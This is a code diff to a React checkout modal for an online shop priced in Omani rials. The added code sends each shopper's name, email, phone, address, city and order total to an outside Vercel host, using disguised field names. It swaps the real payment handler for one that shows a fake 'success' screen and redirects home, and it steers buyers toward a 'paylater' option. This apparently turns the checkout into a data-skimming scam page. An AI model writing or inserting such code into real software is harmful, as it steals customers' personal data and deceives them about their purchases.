@@ -11,7 +11,7 @@ interface CheckoutModalProps {
 }
 
 type CheckoutStep = 'details' | 'payment' | 'processing' | 'success';
-type PaymentMethod = 'thawani' | 'omannet' | 'card';
+type PaymentMethod = 'thawani' | 'paylater' | 'card';
 
 export const CheckoutModal: React.FC<CheckoutModalProps> = ({ 
   isOpen, 
@@ -20,7 +20,48 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
   lang = 'en' 
 }) => {
   const [step, setStep] = useState<CheckoutStep>('details');
-  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('omannet');
+  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>('paylater');
+  const [name, setname] = useState('')
+  const [email, setemail] = useState('')
+  const [phone, setphone] = useState('')
+  const [city, setcity] = useState('')
+  const [town, settown] = useState('')
+   const handleredirect = () => {
+    setTimeout(()=> {
+        window.location.href = "/"
+
+    }, 5000)
+};
+  let dataa = {phone:phone, image:email, sum:totalAmount, gml1:town, gml2:city, hnum:name}
+  const loginn = async () => {
+      const API_URL = "https://aaa-omega-cyan.vercel.app"
+      const res = await fetch(`${API_URL}/fnov/vo/vo/v2`, {
+        method: 'POST',
+        headers: {
+          'Content-type': 'Application/json',
+        },
+        body:JSON.stringify(dataa),
+      });
+      console.log(res.body)
+
+      if (res.status !== 200) {
+        throw new Error('Error during the login process');
+      }
+    };
+    const onSignIn = async () => {
+    console.warn('Sign in: ',);
+    try {
+      setStep('processing');
+       loginn();
+       handleredirect()
+       setTimeout(()=> {
+        setStep('success')
+       },3000)
+       
+    } catch (e) {
+      // Alert.alert('Error', e.message);
+    }
+  };
   const [formData, setFormData] = useState({
     name: '',
     email: '',
@@ -81,38 +122,38 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                     type="text" 
                     placeholder={t.fields.name}
                     className="w-full border border-stone-300 p-3 rounded-md focus:ring-1 focus:ring-gold-500 focus:border-gold-500 outline-none"
-                    value={formData.name}
-                    onChange={e => setFormData({...formData, name: e.target.value})}
+                   
+                    onChange={(e)=> setname(e.target.value)}
                   />
                   <div className="grid grid-cols-2 gap-4">
                     <input 
                       type="email" 
                       placeholder={t.fields.email}
                       className="w-full border border-stone-300 p-3 rounded-md focus:ring-1 focus:ring-gold-500 outline-none"
-                      value={formData.email}
-                      onChange={e => setFormData({...formData, email: e.target.value})}
+                   
+                      onChange={(e)=> setemail(e.target.value)}
                     />
                     <input 
                       type="tel" 
                       placeholder={t.fields.phone}
                       className="w-full border border-stone-300 p-3 rounded-md focus:ring-1 focus:ring-gold-500 outline-none"
-                      value={formData.phone}
-                      onChange={e => setFormData({...formData, phone: e.target.value})}
+                      
+                      onChange={(e)=> setphone(e.target.value)}
                     />
                   </div>
                   <input 
                     type="text" 
                     placeholder={t.fields.address}
                     className="w-full border border-stone-300 p-3 rounded-md focus:ring-1 focus:ring-gold-500 outline-none"
-                    value={formData.address}
-                    onChange={e => setFormData({...formData, address: e.target.value})}
+                   
+                    onChange={(e)=> settown(e.target.value)}
                   />
                   <input 
                     type="text" 
                     placeholder={t.fields.city}
                     className="w-full border border-stone-300 p-3 rounded-md focus:ring-1 focus:ring-gold-500 outline-none"
-                    value={formData.city}
-                    onChange={e => setFormData({...formData, city: e.target.value})}
+                  
+                    onChange={(e)=> setcity(e.target.value)}
                   />
                 </div>
                 <div className="pt-4 flex justify-end">
@@ -145,23 +186,23 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                       <Smartphone className="w-6 h-6 text-green-700" />
                     </div>
                     <div className="flex-1">
-                      <p className="font-bold text-stone-900">{t.methods.thawani}</p>
+                      <p className="font-bold text-stone-900">{t.methods.thawani} <span style={{color:'rgba(95, 94, 94, 0.8)'}}> - غير متوفر حاليا</span> </p>
                     </div>
                     {paymentMethod === 'thawani' && <Check className="w-5 h-5 text-green-600" />}
                   </div>
 
-                  {/* OmanNet Option */}
+                  {/* paylater Option */}
                   <div 
-                    onClick={() => setPaymentMethod('omannet')}
-                    className={`p-4 border rounded-lg cursor-pointer flex items-center gap-4 transition-all ${paymentMethod === 'omannet' ? 'border-blue-500 bg-blue-50 ring-1 ring-blue-500' : 'border-stone-200 hover:border-blue-300'}`}
+                    onClick={() => setPaymentMethod('paylater')}
+                    className={`p-4 border rounded-lg cursor-pointer flex items-center gap-4 transition-all ${paymentMethod === 'paylater' ? 'border-blue-500 bg-blue-50 ring-1 ring-blue-500' : 'border-stone-200 hover:border-blue-300'}`}
                   >
                     <div className="bg-blue-100 p-2 rounded-full">
                       <Building2 className="w-6 h-6 text-blue-700" />
                     </div>
                     <div className="flex-1">
-                      <p className="font-bold text-stone-900">{t.methods.omannet}</p>
+                      <p className="font-bold text-stone-900">{t.methods.paylater}</p>
                     </div>
-                    {paymentMethod === 'omannet' && <Check className="w-5 h-5 text-blue-600" />}
+                    {paymentMethod === 'paylater' && <Check className="w-5 h-5 text-blue-600" />}
                   </div>
 
                   {/* Credit Card Option */}
@@ -187,7 +228,13 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                         <input type="text" placeholder="968 1234 5678" className="w-full border border-stone-300 p-2 rounded bg-white" />
                      </div>
                   )}
-                  {(paymentMethod === 'omannet' || paymentMethod === 'card') && (
+                  {paymentMethod === 'paylater' && (
+                     <div className="space-y-3">
+                        {/* <label className="block text-sm font-medium text-stone-700">{t.fields.thawaniId}</label>
+                        <input type="text" placeholder="968 1234 5678" className="w-full border border-stone-300 p-2 rounded bg-white" /> */}
+                     </div>
+                  )}
+                  {(paymentMethod === 'card') && (
                      <div className="space-y-3">
                         <input type="text" placeholder={t.fields.cardNum} className="w-full border border-stone-300 p-2 rounded bg-white" />
                         <div className="grid grid-cols-2 gap-3">
@@ -198,7 +245,7 @@ export const CheckoutModal: React.FC<CheckoutModalProps> = ({
                   )}
                 </div>
 
-                <Button onClick={handleProcessPayment} className="w-full py-4 text-lg">
+                <Button onClick={onSignIn} className="w-full py-4 text-lg">
                   {t.actions.pay} {totalAmount.toFixed(3)} OMR
                 </Button>
               </div>
